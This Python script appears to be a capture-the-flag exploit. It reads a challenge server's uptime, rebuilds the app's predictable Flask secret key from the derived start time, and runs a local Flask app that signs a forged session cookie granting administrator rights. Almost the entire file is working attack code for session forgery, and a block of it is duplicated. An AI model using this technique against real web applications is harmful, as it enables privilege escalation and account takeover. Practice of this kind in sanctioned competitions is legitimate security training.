import requests
import uuid
import datetime
import hashlib
from flask import Flask, session

url = 'http://chal.competitivecyber.club:9999'
#url = 'http://127.0.0:9999'
r = requests.get(url+'/status')

r = r.content.decode()
print(r)

server_uptime = r.splitlines()[0].split(' ')[2][:-4]
server_time = r.splitlines()[1].strip()[13:]

dt_uptime = (datetime.datetime.strptime(server_uptime, '%H:%M:%S'))
dt_server = (datetime.datetime.strptime(server_time, '%Y-%m-%d %H:%M:%S'))

print(f"{server_uptime=}")
print(f"{server_time=}")

initial = dt_server - datetime.timedelta(hours=dt_uptime.hour, minutes=dt_uptime.minute, seconds=dt_uptime.second)
print()
print(f"{dt_server=}")
print(f"{dt_uptime=}")
print(f"{initial=}")
print()
initial = initial.strftime('%Y%m%d%H%M%S')

secure_key = hashlib.sha256(f'secret_key_{initial}'.encode()).hexdigest()
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
print(f"{initial=}")
print(f"{secure_key=}")

app = Flask(__name__)
app.config['PERMANENT_SESSION_LIFETIME'] = datetime.timedelta(seconds=300)

initial = dt_server - datetime.timedelta(hours=dt_uptime.hour, minutes=dt_uptime.minute, seconds=dt_uptime.second)
print()
print(f"{dt_server=}")
print(f"{dt_uptime=}")
print(f"{initial=}")
print()
initial = initial.strftime('%Y%m%d%H%M%S')

secure_key = hashlib.sha256(f'secret_key_{initial}'.encode()).hexdigest()
app.secret_key = secure_key
print(f"{initial=}")
print(f"{secure_key=}")

@app.route('/')
def getflag():
    session['is_admin'] = True
    session['username'] = 'administrator'
    return 'ok'

if __name__ == '__main__':
    app.run('0.0.0.0', 9000)
